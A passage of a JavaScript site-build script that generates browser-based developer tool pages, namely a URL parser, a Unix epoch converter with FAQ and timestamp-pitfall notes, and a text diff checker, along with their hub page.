            }
          }

          function escapeHtml(str) {
            return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
          }

          window.copyParamVal = function(val) {
            navigator.clipboard.writeText(val);
          };

          window.copyParamsJson = function() {
            var q = parsedObj.queryParams || {};
            var json = JSON.stringify(q, null, 2);
            navigator.clipboard.writeText(json).then(function() {
              var btn = document.getElementById('btnCopyParamsJson');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ Query JSON Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };

          window.copyUrlReport = function() {
            if (!parsedObj.href) parseUrl();
            var p = parsedObj;
            var text = '🌐 Comprehensive URL Architecture Breakdown\n' +
              '• Full URL: ' + (p.href || '') + '\n' +
              '• Origin: ' + (p.origin || '') + '\n' +
              '• Protocol: ' + (p.protocol || '') + '\n' +
              '• Hostname: ' + (p.hostname || '') + '\n' +
              '• Port: ' + (p.port || '') + '\n' +
              '• Pathname: ' + (p.pathname || '') + '\n' +
              '• Path Segments: ' + JSON.stringify(p.pathSegments || []) + '\n' +
              '• Query Params (' + Object.keys(p.queryParams || {}).length + '): ' + JSON.stringify(p.queryParams || {}) + '\n' +
              '• Hash / Fragment: ' + (p.hash || '(none)') + '\n\n' +
              'Parsed at digitaltoolsshed.com/dev/url-parser';

            navigator.clipboard.writeText(text).then(function() {
              var btn = document.getElementById('btnCopyUrlReport');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ URL Report Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };

          document.addEventListener('DOMContentLoaded', parseUrl);
          parseUrl();
        </script>
      `
    },
    {
      slug: 'epoch-converter',
      title: 'Unix Timestamp & Epoch Converter',
      metaDesc: 'Convert Unix timestamps in seconds and milliseconds to human-readable UTC and local dates. Includes live ticking clock and code snippets.',
      category: 'Developer',
      faq: [
        { q: 'What is Unix Epoch time?', a: 'Unix time (or POSIX time) is the number of seconds that have elapsed since Thursday, January 1, 1970 00:00:00 UTC (Coordinated Universal Time), minus leap seconds.' },
        { q: 'How do you convert Unix timestamp to human-readable date in JavaScript?', a: 'In JavaScript, multiply the 10-digit epoch timestamp by 1000 to convert to milliseconds, then pass to Date: new Date(timestamp * 1000).toISOString() or .toLocaleString().' },
        { q: 'What is the Year 2038 problem in Unix timestamps?', a: 'The Year 2038 problem (Y2K38) occurs when 32-bit signed integers overflow on January 19, 2038 at 03:14:07 UTC. Modern 64-bit systems resolve this by supporting dates billions of years into the future.' }
      ],
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; Epoch Converter
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">Unix Timestamp & Epoch Converter</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Convert Unix timestamps (seconds & milliseconds) to human dates and vice versa with live timezone formatting.
          </p>

          <div style="background: var(--surface-alt); border: 1px solid var(--border); border-radius: 8px; padding: 1.25rem; margin-bottom: 2rem; text-align: center;">
            <span style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase;">CURRENT UNIX EPOCH TIME (SECONDS)</span>
            <div id="live-epoch" style="font-family: var(--mono); font-size: 2.4rem; font-weight: bold; color: #10b981; margin: 0.25rem 0;">0</div>
            <span id="live-utc" style="font-family: var(--mono); font-size: 0.85rem; color: var(--text-muted);">...</span>
          </div>

          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; margin-bottom: 2rem;">
            <div class="tool-box">
              <h3 style="font-family: var(--serif); font-size: 1.15rem; margin-bottom: 1rem;">Timestamp to Date</h3>
              <div style="margin-bottom: 1rem;">
                <label class="field-label">Timestamp (Seconds or Milliseconds)</label>
                <input type="text" id="tsInput" class="text-input" value="1756857600" oninput="convertTimestamp()" />
              </div>
              <div style="display: flex; gap: 0.4rem; margin-bottom: 1rem;">
                <button class="btn-sec" style="font-size: 0.75rem; padding: 0.25rem 0.5rem;" onclick="setNowTs()">Set to Now</button>
                <button class="btn-sec" style="font-size: 0.75rem; padding: 0.25rem 0.5rem;" onclick="setTs(0)">Epoch 0</button>
                <button class="btn-sec" style="font-size: 0.75rem; padding: 0.25rem 0.5rem;" onclick="setTs(2147483647)">Y2038 Max</button>
              </div>

              <div id="tsResults" style="display: grid; gap: 0.75rem; font-family: var(--mono); font-size: 0.85rem;"></div>
            </div>

            <div class="tool-box">
              <h3 style="font-family: var(--serif); font-size: 1.15rem; margin-bottom: 1rem;">Human Date to Timestamp</h3>
              <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.5rem; margin-bottom: 0.75rem;">
                <div>
                  <label class="field-label">Year</label>
                  <input type="number" id="dtYear" class="text-input" value="2026" oninput="convertDateToTs()" />
                </div>
                <div>
                  <label class="field-label">Month (1-12)</label>
                  <input type="number" id="dtMonth" class="text-input" value="9" min="1" max="12" oninput="convertDateToTs()" />
                </div>
                <div>
                  <label class="field-label">Day</label>
                  <input type="number" id="dtDay" class="text-input" value="3" min="1" max="31" oninput="convertDateToTs()" />
                </div>
              </div>
              <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.5rem; margin-bottom: 1rem;">
                <div>
                  <label class="field-label">Hour (0-23)</label>
                  <input type="number" id="dtHour" class="text-input" value="12" min="0" max="23" oninput="convertDateToTs()" />
                </div>
                <div>
                  <label class="field-label">Minute</label>
                  <input type="number" id="dtMin" class="text-input" value="0" min="0" max="59" oninput="convertDateToTs()" />
                </div>
                <div>
                  <label class="field-label">Second</label>
                  <input type="number" id="dtSec" class="text-input" value="0" min="0" max="59" oninput="convertDateToTs()" />
                </div>
              </div>

              <div id="dateResults" style="display: grid; gap: 0.75rem; font-family: var(--mono); font-size: 0.85rem;"></div>
            </div>
          </div>

          <!-- Copy Epoch Summary -->
          <button type="button" id="btnCopyEpoch" onclick="copyEpochSummary()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
            <span>📋 Copy Epoch Timestamp Diagnostic Summary</span>
          </button>

          <!-- 5 Critical Epoch Engineering Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in Epoch Timestamps &amp; Time APIs</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. The Year 2038 Problem (Y2038 32-Bit Signed Integer Overflow)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Unix time stored as a 32-bit signed integer (<code>int32_t</code>) tops out at 2,147,483,647 seconds on January 19, 2038, at 03:14:07 UTC. At that exact second, the integer overflows to -2,147,483,648, jumping backwards to December 13, 1901. Embedded devices, older database schemas, and legacy C binaries that fail to migrate to 64-bit timestamps will crash globally.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. The Seconds vs. Milliseconds Magnitude Drift (10^10 vs 10^13)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  POSIX, Python, and Go standard libraries default to integer seconds (e.g. <code>1725580800</code>, 10 digits). JavaScript <code>Date.now()</code> and Java <code>currentTimeMillis()</code> default to milliseconds (13 digits). Passing a millisecond timestamp into a seconds-based API causes the parser to register the year 56,600+ AD! Always verify timestamp scale.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Leap Second Desynchronization &amp; Server Panics</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  International Earth Rotation services occasionally add leap seconds (e.g. 23:59:60) to align astronomical time with atomic clocks. POSIX Unix time strictly assumes exactly 86,400 SI seconds per day, repeating or freezing second 86,400. Unpatched Linux kernels suffer deadlocks unless "leap smearing" NTP daemons (e.g. Google/Amazon NTP) gradually smear the extra second across 24 hours.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. The JavaScript 'YYYY-MM-DD' Midnight UTC Offset Bug</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  In JavaScript, passing an ISO date string without time (<code>new Date("2026-09-06")</code>) is parsed strictly as UTC midnight (00:00:00 UTC). When rendered in local time for US timezones (e.g. EDT UTC-4), it rolls back to 8:00 PM on September 5th! In contrast, <code>new Date("2026/09/06")</code> parses as local midnight.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Negative Epoch Timestamps &amp; Pre-1970 Historical Dates</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Dates before January 1, 1970, are represented by negative integer seconds (e.g. July 20, 1969 Apollo landing is <code>-14159040</code>). Systems storing timestamps as unsigned integers (<code>uint32</code> or <code>uint64</code>) underflow negative values into massive future dates around year 2106 or beyond.
                </p>
              </div>
            </div>
          </div>

          <div class="ad-blend-box" style="margin: 2rem 0;">
            <span class="ad-label">Sponsored Resource</span>
            <div class="ad-unit-300x250">
              <script type="text/javascript">
                atOptions = {
                  'key' : '335d807d460eaf2491fcca0f635474ce',
                  'format' : 'iframe',
                  'height' : 250,
                  'width' : 300,
                  'params' : {}
                };
              </script>
              <script type="text/javascript" src="https://manyapostle.com/335d807d460eaf2491fcca0f635474ce/invoke.js"></script>
            </div>
          </div>
        </div>

        <script>
          
          window.copyEpochSummary = function() {
            var raw = (document.getElementById('tsInput') ? document.getElementById('tsInput').value : '').trim();
            var nowSec = Math.floor(Date.now() / 1000);
            var num = parseFloat(raw) || nowSec;
            var isMs = num > 1e11;
            var ms = isMs ? num : num * 1000;
            var d = new Date(ms);

            var text = '⏱️ Unix Epoch Timestamp Conversion Summary\n' +
              '• Unix Timestamp: ' + num + (isMs ? ' (ms)' : ' (seconds)') + '\n' +
              '• GMT / UTC: ' + d.toUTCString() + '\n' +
              '• Local Time: ' + d.toString() + '\n' +
              '• ISO 8601: ' + d.toISOString() + '\n\n' +
              'Converted at digitaltoolsshed.com/dev/epoch-converter';

            navigator.clipboard.writeText(text).then(function() {
              var btn = document.getElementById('btnCopyEpoch');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ Epoch Summary Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };
  
          function updateLiveClock() {
            var now = new Date();
            var sec = Math.floor(now.getTime() / 1000);
            var el = document.getElementById('live-epoch');
            if (el) el.textContent = sec;
            var u = document.getElementById('live-utc');
            if (u) u.textContent = 'UTC: ' + now.toUTCString();
          }
          setInterval(updateLiveClock, 1000);
          updateLiveClock();

          function convertTimestamp() {
            var raw = (document.getElementById('tsInput').value || '').trim();
            var num = parseFloat(raw);
            if (isNaN(num)) {
              document.getElementById('tsResults').innerHTML = '<span style="color:#ef4444;">Invalid number</span>';
              return;
            }
            // If greater than 100 billion, assume milliseconds
            var isMs = num > 1e11;
            var ms = isMs ? num : num * 1000;
            var d = new Date(ms);

            document.getElementById('tsResults').innerHTML = 
              '<div style="padding:0.65rem; background:var(--surface); border:1px solid var(--border); border-radius:4px;">' +
                '<span style="color:var(--text-muted); font-size:0.7rem;">GMT / UTC DATE</span>' +
                '<div style="font-weight:bold; color:var(--fg);">' + d.toUTCString() + '</div>' +
              '</div>' +
              '<div style="padding:0.65rem; background:var(--surface); border:1px solid var(--border); border-radius:4px;">' +
                '<span style="color:var(--text-muted); font-size:0.7rem;">LOCAL TIME</span>' +
                '<div style="font-weight:bold; color:var(--fg);">' + d.toString() + '</div>' +
              '</div>' +
              '<div style="padding:0.65rem; background:var(--surface); border:1px solid var(--border); border-radius:4px;">' +
                '<span style="color:var(--text-muted); font-size:0.7rem;">ISO 8601 STRING</span>' +
                '<div style="color:#3b82f6;">' + d.toISOString() + '</div>' +
              '</div>';
          }

          function setNowTs() {
            document.getElementById('tsInput').value = Math.floor(Date.now() / 1000);
            convertTimestamp();
          }
          function setTs(val) {
            document.getElementById('tsInput').value = val;
            convertTimestamp();
          }

          function convertDateToTs() {
            var y = parseInt(document.getElementById('dtYear').value, 10) || 2026;
            var m = (parseInt(document.getElementById('dtMonth').value, 10) || 1) - 1;
            var d = parseInt(document.getElementById('dtDay').value, 10) || 1;
            var h = parseInt(document.getElementById('dtHour').value, 10) || 0;
            var min = parseInt(document.getElementById('dtMin').value, 10) || 0;
            var s = parseInt(document.getElementById('dtSec').value, 10) || 0;

            var utcDate = new Date(Date.UTC(y, m, d, h, min, s));
            var epochSec = Math.floor(utcDate.getTime() / 1000);
            var epochMs = utcDate.getTime();

            document.getElementById('dateResults').innerHTML = 
              '<div style="padding:0.65rem; background:var(--surface); border:1px solid var(--border); border-radius:4px;">' +
                '<span style="color:var(--text-muted); font-size:0.7rem;">UNIX TIMESTAMP (SECONDS)</span>' +
                '<div style="font-size:1.4rem; font-weight:bold; color:#10b981;">' + epochSec + '</div>' +
              '</div>' +
              '<div style="padding:0.65rem; background:var(--surface); border:1px solid var(--border); border-radius:4px;">' +
                '<span style="color:var(--text-muted); font-size:0.7rem;">TIMESTAMP (MILLISECONDS)</span>' +
                '<div style="color:var(--fg);">' + epochMs + '</div>' +
              '</div>';
          }

          document.addEventListener('DOMContentLoaded', function() {
            convertTimestamp();
            convertDateToTs();
          });
          convertTimestamp();
          convertDateToTs();
        </script>
      `
    },
    {
      slug: 'diff-checker',
      title: 'Online Text & Code Diff Checker',
      metaDesc: 'Compare two text files or code snippets side-by-side. Highlights additions, deletions, and character differences directly in your browser.',
      category: 'Developer',
      faq: [
        { q: 'How does this online diff checker work?', a: 'This tool performs a line-by-line comparison between your original and modified text directly inside your browser. Added lines are highlighted in green, while deleted lines are highlighted in red.' },
        { q: 'Is my text or code private when using this diff tool?', a: 'Yes, 100% private. All text comparisons and diff algorithms run client-side in your web browser. No text is ever uploaded or stored on any server.' },
        { q: 'Can I use this diff tool for programming code?', a: 'Yes. It supports JavaScript, Python, JSON, HTML, CSS, SQL, Markdown, or any plain-text document format.' }
      ],
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; Diff Checker
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">Online Text & Code Diff Checker</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Compare two text or code files side-by-side with additions and deletions highlighted in real time.
          </p>

          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1rem;">
            <div>
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
                <label class="field-label" style="margin:0;">Original Text</label>
                <button class="btn-sec" style="font-size:0.7rem; padding:0.2rem 0.4rem;" onclick="document.getElementById('diffTextA').value=''; runDiff();">Clear</button>
              </div>
              <textarea id="diffTextA" class="text-input" style="height: 220px; font-family: var(--mono); font-size: 0.85rem;" oninput="runDiff()">function calculateTotal(items) {
  let total = 0;
  for (let i = 0; i < items.length; i++) {
    total += items[i].price;
  }
  return total;
}</textarea>
            </div>
            <div>
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
                <label class="field-label" style="margin:0;">Modified Text</label>
                <button class="btn-sec" style="font-size:0.7rem; padding:0.2rem 0.4rem;" onclick="document.getElementById('diffTextB').value=''; runDiff();">Clear</button>
              </div>
              <textarea id="diffTextB" class="text-input" style="height: 220px; font-family: var(--mono); font-size: 0.85rem;" oninput="runDiff()">function calculateTotal(items, discount = 0) {
  const subtotal = items.reduce((sum, item) => sum + item.price, 0);
  const tax = subtotal * 0.08;
  return (subtotal - discount) + tax;
}</textarea>
            </div>
          </div>

          <div style="display: flex; gap: 0.5rem; margin-bottom: 1.5rem; align-items: center; flex-wrap: wrap;">
            <button class="btn-primary" onclick="runDiff()">Compare Differences</button>
            <button class="btn-sec" onclick="swapDiff()">Swap Texts</button>
            <span id="diffStats" style="font-family: var(--mono); font-size: 0.85rem; color: var(--text-muted); margin-left: auto;"></span>
          </div>

          <div class="tool-box" style="padding: 1rem;">
            <div class="field-label" style="margin-bottom: 0.75rem;">DIFFERENCE REPORT</div>
            <div id="diffOutput" style="font-family: var(--mono); font-size: 0.85rem; line-height: 1.6; max-height: 400px; overflow-y: auto; border: 1px solid var(--border); background: var(--surface-alt); border-radius: 4px; padding: 0.75rem;"></div>
          </div>

          <div class="ad-blend-box" style="margin: 2rem 0;">
            <span class="ad-label">Sponsored Resource</span>
            <div class="ad-unit-300x250">
              <script type="text/javascript">
                atOptions = {
                  'key' : '335d807d460eaf2491fcca0f635474ce',
                  'format' : 'iframe',
                  'height' : 250,
                  'width' : 300,
                  'params' : {}
                };
              </script>
              <script type="text/javascript" src="https://manyapostle.com/335d807d460eaf2491fcca0f635474ce/invoke.js"></script>
            </div>
          </div>
        </div>

        <script>
          function runDiff() {
            var textA = document.getElementById('diffTextA').value.split('\\n');
            var textB = document.getElementById('diffTextB').value.split('\\n');

            var outHtml = '';
            var adds = 0, dels = 0, unch = 0;

            var maxLen = Math.max(textA.length, textB.length);
            for (var i = 0; i < maxLen; i++) {
              var lineA = textA[i];
              var lineB = textB[i];

              if (lineA === lineB) {
                unch++;
                outHtml += '<div style=\"padding:0.15rem 0.5rem; color:var(--text-muted);\">  ' + escapeDiff(lineA || '') + '</div>';
              } else {
                if (lineA !== undefined) {
                  dels++;
                  outHtml += '<div style=\"padding:0.15rem 0.5rem; background:rgba(239, 68, 68, 0.15); color:#ef4444;\">- ' + escapeDiff(lineA) + '</div>';
                }
                if (lineB !== undefined) {
                  adds++;
                  outHtml += '<div style=\"padding:0.15rem 0.5rem; background:rgba(34, 197, 94, 0.15); color:#22c55e;\">+ ' + escapeDiff(lineB) + '</div>';
                }
              }
            }

            document.getElementById('diffOutput').innerHTML = outHtml || '<span style=\"color:var(--text-muted);\">Both texts are identical!</span>';
            document.getElementById('diffStats').textContent = '+' + adds + ' additions, -' + dels + ' deletions';
          }

          function swapDiff() {
            var a = document.getElementById('diffTextA');
            var b = document.getElementById('diffTextB');
            var tmp = a.value;
            a.value = b.value;
            b.value = tmp;
            runDiff();
          }

          function escapeDiff(str) {
            return (str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
          }

          document.addEventListener('DOMContentLoaded', runDiff);
          runDiff();
        </script>
      `
    }
  ];

  // Render individual pages
  for (const tool of tools) {
    const html = renderPage({
      title: `${tool.title} | Digital Tools Shed`,
      metaDesc: tool.metaDesc,
      canonical: `${DOMAIN}/dev/${tool.slug}`,
      bodyContent: tool.body,
      currentPath: `/dev/${tool.slug}`,
      faq: tool.faq
    });
    writeFileSync(join(devDist, `${tool.slug}.html`), html);
  }

  // Render Hub Page
  const hubCards = tools.map(t => `
    <a href="/dev/${t.slug}" style="display: block; background: var(--surface); border: 1px solid var(--border); padding: 1.25rem; border-radius: 6px; text-decoration: none; color: inherit; transition: border-color 0.2s;">
      <h3 style="font-family: var(--serif); font-size: 1.15rem; margin: 0 0 0.4rem; color: var(--fg);">${t.title}</h3>
      <p style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.5; margin: 0;">${t.metaDesc}</p>
    </a>
  `).join('');

  const hubBody = `
    ${commonStyle}
    <div class="article-container" style="max-width: 900px;">
      <h1 style="font-family: var(--serif); font-size: 2rem; margin-bottom: 0.5rem;">Developer Tools Suite</h1>
      <p style="color: var(--text-muted); font-size: 1rem; line-height: 1.6; margin-bottom: 2rem;">
        Essential developer utilities: JWT token decoders, regex visualizers, SQL formatters, JSON converters, CSS minifiers, and Linux chmod tools.
      </p>

      <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1rem;">
        ${hubCards}
      </div>
    </div>
  `;

  writeFileSync(join(devDist, 'index.html'), renderPage({
    title: 'Developer Tools Suite | Digital Tools Shed',
    metaDesc: 'Free online developer tools: JWT decoder, Regex tester, SQL formatter, JSON to CSV, CSS minifier, and subnet calculator.',
    canonical: `${DOMAIN}/dev/`,
    bodyContent: hubBody,
    currentPath: '/dev/'
  }));

  console.log(`  ✓ Built Developer Tools Suite (${tools.length} tools in /dev/)`);
}
